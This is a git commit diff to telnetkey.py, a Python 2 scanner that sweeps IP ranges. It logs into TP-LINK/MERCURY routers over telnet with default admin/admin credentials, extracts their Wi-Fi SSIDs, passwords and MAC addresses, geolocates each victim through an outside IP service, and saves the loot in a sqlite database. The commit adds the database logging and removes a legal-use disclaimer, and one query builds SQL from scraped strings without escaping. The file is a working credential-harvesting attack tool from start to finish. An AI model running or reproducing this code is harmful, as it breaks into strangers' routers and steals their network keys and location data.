8af61515ba718185d7669da2b37553dec7b04acd
root <root@localhost.localdomain>
2016-06-01 16:29:18 +0800

    增加了数据库支持（sqlite3）

--- telnetkey.py
+++ telnetkey.py
@@ -3,13 +3,19 @@
 # code by 92ez.com
 # python telnetkey.py 1.1.1.1-1.1.2.1 200
 
-import threading
-import telnetlib
+from threading import Thread
+from telnetlib import Telnet
+import requests
+import sqlite3
 import signal
 import Queue
 import time
+import json
 import sys
 import re
+
+reload(sys)
+sys.setdefaultencoding('utf8')
 
 #ip to num
 def ip2num(ip):
@@ -29,21 +35,22 @@ def bThread(iplist):
     threadl = []
     queue = Queue.Queue()
     hosts = iplist
-    j = 0
     for host in hosts:
-        queue.put([host,j])
-        j += 1
+        queue.put(host)
     for x in xrange(0, int(sys.argv[2])):
         threadl.append(tThread(queue))
     for t in threadl:
-        t.start()
+        try:
+            t.start()
+        except:
+            pass
     for t in threadl:
         t.join()
 
 #create thread
-class tThread(threading.Thread):
+class tThread(Thread):
     def __init__(self, queue):
-        threading.Thread.__init__(self)
+        Thread.__init__(self)
         self.queue = queue
 
     def run(self):
@@ -58,17 +65,25 @@ def killscan(signal,frame):
     print '[*] will kill pid '+str(os.getpid())+'\n'
     os.kill(os.getpid(),9)
 
-def getinfo(hostinfo):
+def getposition(host):
+    try:
+        ipurl = "http://ip.taobao.com/service/getIpInfo.php?ip="+host
+        header = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"}
+        req = requests.get(url = ipurl,headers = header,timeout = 5)
+        jsondata = json.loads(req.content.decode('utf8').encode('utf8'))['data']
+        info = [jsondata['country'],jsondata['region'],jsondata['city'],jsondata['isp']]
+        return info
+    except Exception, e:
+        pass
 
-    host = hostinfo[0]
-    index = hostinfo[1]
+def getinfo(host):
     username = "admin"
     password = "admin"
     telnetTime = 10
     cmdTime = 3
 
     try:
-        t = telnetlib.Telnet(host, timeout = telnetTime)
+        t = Telnet(host, timeout = telnetTime)
         #login
         t.read_until("username:", cmdTime)
         t.write(username + "\n")
@@ -94,27 +109,46 @@ def getinfo(hostinfo):
             wifiStr = "".join(wifiStr.split())
             wifiStr = wifiStr.decode('utf-8').encode('utf-8')
             #get SID KEY MAC
-            SID = wifiStr[1:wifiStr.find('QSS')]
-            KEY = wifiStr[wifiStr.find('Key=') + 4:wifiStr.find('cmd')] if wifiStr.find('Key=') != -1 else '无密码'
-            MAC = lanStr[1:lanStr.find('__')].replace('\n','')
+            ssid = wifiStr[1:wifiStr.find('QSS')]
+            key = wifiStr[wifiStr.find('Key=') + 4:wifiStr.find('cmd')] if wifiStr.find('Key=') != -1 else '无密码'
+            mac = lanStr[1:lanStr.find('__')].replace('\n','')
 
             currentTime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
-            print '['+ str(index) +'/'+ str(TOTALIP) +'][Get] '+currentTime +'  ' +host +'  '+ SID +'  ' + KEY +'  '+MAC
-    except:
+
+            try:
+                cx = sqlite3.connect(sys.path[0]+"/TPLINKKEY.db")
+                cu = cx.cursor()
+                cu.execute("select * from scanlog where ssid='%s' and key='%s'" % (ssid,key))
+                if not cu.fetchone():
+                    posData = getposition(host)
+                    country = unicode(posData[0])
+                    province = unicode(posData[1])
+                    city = unicode(posData[2])
+                    isp = unicode(posData[3])
+                    cu.execute("insert into scanlog (host,mac,ssid,key,country,province,city,isp) values (?,?,?,?,?,?,?,?)", (host,mac,ssid,key,country,province,city,isp))
+                    cx.commit()
+                    print '[√] ['+currentTime +'] Found ' +host +'  '+ ssid +'  ' + key +' => Insert successly!'
+                else:
+                    print '[x] ['+currentTime +'] Found ' +host +'  '+ ssid +'  ' + key +' <= Found in database!'
+                cu.close()
+                cx.close()
+            except Exception, e:
+                print e
+    except Exception,e:
         pass
 
 if __name__ == '__main__':
-    print 'Just make a test in the extent permitted by law  (^_^)'
+    print '=========================================='
+    print ' Scan TPLINK(MERCURY) wifi key by telnet'
+    print '           Author 92ez.com'
+    print '=========================================='
 
     startIp = sys.argv[1].split('-')[0]
     endIp = sys.argv[1].split('-')[1]
     iplist = ip_range(startIp, endIp)
 
-    global TOTALIP
-    TOTALIP = len(iplist)
-
-    print '\n[*] Total '+str(TOTALIP)+" IP..."
-    print '[*] Running...'
+    print '\n[*] Total '+str(len(iplist))+" IP..."
+    print '\n================ Running ================='
 
     signal.signal(signal.SIGINT,killscan)
     bThread(iplist)
